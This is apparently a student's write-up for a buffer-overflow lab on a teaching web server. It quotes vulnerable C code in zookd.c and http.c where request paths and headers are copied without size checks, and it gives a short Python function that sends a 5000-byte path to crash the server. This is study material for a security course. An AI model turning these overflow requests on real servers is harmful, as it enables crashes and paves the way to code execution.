# LAB 1: Buffer overflows

## Part 1

### Exercise 1

### Exploits

#### Exploit 1

In `zookd.c` the `reqpath` buffer can be exploited

```c
char reqpath[4096];

if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
    return http_err(fd, 500, "http_request_line: %s", errmsg);
```

In the `url_decode` the contents from the path `sp1` are moved into `reqpath`, without size validation

```c
url_decode(reqpath, sp1);
```

We can pass a big path to exploit this vulnerability

#### Exploit 2

In `http.c` the `value` and `envvar` buffers can be exploited

```c
const char *http_request_headers(int fd)
{
    static char buf[8192];      /* static variables are not on the stack */
    int i;
    char value[512];
    char envvar[512];
```

The `envvar` buffer has 512 bytes and buf 8192 bytes

```c
    if (strcmp(buf, "CONTENT_TYPE") != 0 &&
        strcmp(buf, "CONTENT_LENGTH") != 0) {
        sprintf(envvar, "HTTP_%s", buf);
        setenv(envvar, value, 1);
    } else {
        setenv(buf, value, 1);
    }
```

We can pass a big header to exploit this vulnerability

- In `http.c` the `pn` buffer can't be exploited by a buffer overflow but maybe we can use other techniques to get file access
- In `http.c` environment variables are set based on HTTP headers this can be very dangerous 

### Exercise 2

We can send a 5000 byte path to crash the program 

```python
def build_exploit(shellcode):
    path = b"A" * 5000
    req =   b"GET /" + path + b" HTTP/1.0\r\n" + \
            b"\r\n"
    return req
```
